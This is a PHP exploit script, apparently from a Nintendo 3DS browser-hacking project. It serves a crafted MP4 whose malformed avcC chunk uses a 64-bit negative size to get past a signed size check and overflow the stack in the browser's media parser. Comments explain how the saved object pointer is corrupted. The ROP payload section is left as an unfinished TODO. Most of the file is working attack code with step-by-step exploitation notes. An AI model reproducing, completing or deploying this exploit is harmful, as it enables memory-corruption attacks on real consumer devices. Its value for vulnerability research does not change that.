<?php

//The vuln used here was discovered with manual code-RE, and exploited, on July 6, 2016. This is a stack buffer overflow, due to a broken size check.

include_once("/home/yellows8/browserhax/browserhax_cfg.php");

include_once("3dsbrowserhax_common.php");

if(($browserver & 0x80) == 0)
{
	echo "This browser is not supported.\n";
	exit;
}

$ROPHEAP = 0x10000000-0x1e000;

$generatebinrop = 1;
generate_ropchain();

$con = "";

//Generate the mp4 header.
$con.= pack("N*", 0x00000020);
$con.= pack("N*", 0x66747970);
$con.= pack("N*", 0x69736F6D);
$con.= pack("N*", 0x00000200);
$con.= pack("N*", 0x69736F6D);
$con.= pack("N*", 0x69736F32);
$con.= pack("N*", 0x61766331);
$con.= pack("N*", 0x6D703431);
$con.= pack("N*", 0x00000008);
$con.= pack("N*", 0x66726565);

//Setup the avcC haxx chunk: size+chunkid, followed by the actual chunk size in 64bit form.
$con.= pack("N*", 0x1);
$con.= pack("N*", 0x61766343);
$con.= pack("N*", 0xFFFFFFFF);
$con.= pack("N*", 0x200+0x10);//Use +0x10 so that the actual low-u32 size is 0x200. Note that the stack-frame isn't actually this large.

//The v10.6 SKATER libstagefright avcC handler code is *very* old. It does this signed compare: if(0x100 < chunk_data_size)fail
//Then readAt() is called with buf=sp+0x40 and size=<low word from chunk_data_size>.
//If that's successful, it then calls mLastTrack->meta->setData() with the above buf and size. For loading the mLastTrack ptr, it loads the saved inr0 _this from sp+0x140, then it loads mLastTrack from there.

//Hence, the size check can be bypassed by using a 64bit negative chunk_size, with whatever size you want to copy to stack for the low-word in the chunk_size, +0x10.
//When the copy-size is large enough(see above), the saved _this ptr will be corrupted. A fake _this ptr and the data used with it has to be setup so that it doesn't crash with that.

//Setup the data copied to stack.
for($i=0; $i<0x200; $i+=4)
{
	//TODO
	//$con.= pack("V*", $POPPC);
}

//$con.= $ROPCHAIN;//Beginning of the actual ROP.

header("Content-Type: video/mp4");

echo $con;

?>
